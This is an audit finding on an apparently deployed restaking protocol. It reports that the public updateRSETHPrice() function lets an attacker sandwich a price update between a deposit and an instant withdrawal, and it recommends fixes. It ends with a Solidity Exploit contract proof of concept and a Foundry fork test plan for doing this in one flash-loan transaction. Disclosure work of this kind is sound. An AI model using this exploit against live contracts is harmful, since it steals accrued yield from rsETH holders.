Audit Report

## Title
Unguarded Public `updateRSETHPrice()` Enables Sandwich Attack to Steal Accrued Yield from rsETH Holders - (File: `contracts/LRTOracle.sol`)

## Summary
`LRTOracle.updateRSETHPrice()` is declared `public` with no role restriction, allowing any caller to trigger a price update at will. Combined with the public `LRTDepositPool.depositETH()` and `LRTWithdrawalManager.instantWithdrawal()`, an attacker can atomically deposit at a stale (lower) rsETH price, trigger the price update to capture accrued EigenLayer rewards, and immediately withdraw at the new higher price — stealing yield that belongs to existing rsETH holders. The `pricePercentageLimit` guard provides only partial mitigation and is entirely absent when the limit is unset (zero).

## Finding Description

**Root cause:** `updateRSETHPrice()` carries no access control:

```solidity
// contracts/LRTOracle.sol L87-89
function updateRSETHPrice() public whenNotPaused {
    _updateRsETHPrice();
}
```

The internal `_updateRsETHPrice()` computes the new price as `(totalETHInProtocol - protocolFeeInETH) / rsethSupply` (L250), where `totalETHInProtocol` includes all ETH across the deposit pool, NDCs, EigenLayer, and the unstaking vault. When EigenLayer rewards accrue between two price updates, the stored `rsETHPrice` is stale (lower than true value).

**Deposit minting uses the stored stale price:**
```solidity
// contracts/LRTDepositPool.sol L520
rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
```

**Instant withdrawal redemption also uses the stored price at call time:**
```solidity
// contracts/LRTWithdrawalManager.sol L593
underlyingToReceive = amount * lrtOracle.rsETHPrice() / lrtOracle.getAssetPrice(asset);
```

**Exploit sequence (single transaction):**
1. Attacker deposits a large ETH amount via `depositETH()` — rsETH minted at the stale (lower) price, giving the attacker more rsETH than their proportional share of the true pool value.
2. Attacker calls `updateRSETHPrice()` — the price rises to reflect accrued rewards. The attacker's rsETH is now worth more ETH than was deposited.
3. Attacker calls `instantWithdrawal()` — rsETH is redeemed at the new higher price, returning more ETH than deposited.

**Why the `pricePercentageLimit` guard is insufficient:**

`_updateRsETHPrice()` contains a threshold check at L252-266:
```solidity
bool isPriceIncreaseOffLimit =
    pricePercentageLimit > 0 && priceDifference > pricePercentageLimit.mulWad(highestRsethPrice);
if (isPriceIncreaseOffLimit) {
    if (!IAccessControl(address(lrtConfig)).hasRole(LRTConstants.MANAGER, msg.sender)) {
        revert PriceAboveDailyThreshold();
    }
}
```

This guard has two failure modes:
- When `pricePercentageLimit == 0` (the default/unset state), the condition `pricePercentageLimit > 0` is false and the entire check is skipped — no protection whatsoever.
- When `pricePercentageLimit > 0`, the guard only blocks price increases *exceeding* the configured limit. Any reward accrual that falls within the limit (e.g., rewards < 1% of TVL when limit is 1%) is still fully exploitable. The attacker simply waits for a sub-threshold reward accumulation and executes the sandwich.

## Impact Explanation

**High — Theft of unclaimed yield.**

Accrued EigenLayer rewards that should be distributed pro-rata to all rsETH holders are instead partially captured by the attacker. In the numerical example from the claim: 10 ETH of rewards accrue; the attacker captures 5 ETH of that yield, leaving original holders with 105 ETH instead of 110 ETH. The attack is repeatable every time rewards accrue and is executable with a flash loan (zero net capital required), making it risk-free and scalable.

## Likelihood Explanation

**Medium.** Three preconditions must hold simultaneously:
1. `isInstantWithdrawalEnabled[asset]` must be `true` — a manager-set flag expected to be enabled during normal operation.
2. `LRTUnstakingVault` must hold sufficient liquid assets to cover the instant withdrawal — expected during normal operation.
3. Rewards must have accrued since the last `updateRSETHPrice()` call — routine between oracle updates.

No mempool monitoring is required; all three functions are callable atomically from a single attacker contract. The attack is repeatable on every reward accrual cycle.

## Recommendation

Restrict `updateRSETHPrice()` to authorized callers, consistent with the already-existing `updateRSETHPriceAsManager()` pattern:

```solidity
// Replace the public function with a role-gated version
function updateRSETHPrice() external onlyLRTOperator whenNotPaused {
    _updateRsETHPrice();
}
```

Alternatively, if a public price update path must be preserved for keeper bots, implement a deposit/withdrawal cooldown (e.g., require that no deposit from `msg.sender` occurred in the same block) or a TWAP mechanism so that a single block's deposit cannot capture the full pending reward delta.

## Proof of Concept

```solidity
contract Exploit {
    ILRTDepositPool depositPool;
    ILRTOracle oracle;
    ILRTWithdrawalManager withdrawalManager;
    IRSETH rsETH;

    function attack() external payable {
        // Step 1: Deposit at stale (lower) rsETH price — receive excess rsETH
        depositPool.depositETH{value: msg.value}(0, "");

        // Step 2: Trigger price update — public, no access control
        // rsETHPrice rises to reflect accrued EigenLayer rewards
        oracle.updateRSETHPrice();

        // Step 3: Instant withdrawal at new higher price
        uint256 rsETHBalance = rsETH.balanceOf(address(this));
        rsETH.approve(address(withdrawalManager), rsETHBalance);
        withdrawalManager.instantWithdrawal(ETH_TOKEN, rsETHBalance, "");

        // address(this).balance > initial msg.value — profit from stolen yield
    }
}
```

**Foundry fork test plan:**
1. Fork mainnet at a block where EigenLayer rewards have accrued since the last `updateRSETHPrice()` call.
2. Deploy the `Exploit` contract and fund it (or use a flash loan).
3. Call `attack()` in a single transaction.
4. Assert `address(exploit).balance > initialDeposit` and that existing rsETH holders' redemption value decreased relative to a baseline run without the attack.
5. Confirm the attack reverts only when `pricePercentageLimit > 0` and the reward delta exceeds the configured threshold, and succeeds in all other cases.
